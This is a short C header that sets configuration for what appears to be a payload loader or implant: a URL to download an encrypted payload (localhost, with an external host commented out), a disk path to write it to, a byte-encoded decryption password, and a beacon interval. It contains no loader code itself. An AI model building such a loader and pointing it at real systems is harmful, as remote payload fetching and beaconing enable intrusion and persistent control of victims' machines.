#ifndef PREFERENCES_H
#define PREFERENCES_H

//---------------------------------------------------------------
// EDIT PAYLOAD SETTINGS HERE

#define PAYLOAD_URL "https://127.0.0.1:25566/api/testloader?send=payload-6" //"https://fruit.qc.to:25566/api/testloader?send=payload-6" // URL to download the payload from
#define PATH_TO_WRITE "../test_files/demo_file" // path to write payload to on host disk (if not executable)
#define ENC_PASSWORD "\xea\xf7\xee\xe2\xff\xe3\xea\xd0\xff\xee\xfc\xfc\xf8\xe0\xfd\xeb" // symmetric password for decryption generated by passgen.py
#define BEACON_MODE 0 // 0 for instantly beacon once, any positive number x for beacon every x seconds

//----------------------------------------------------------------

#endif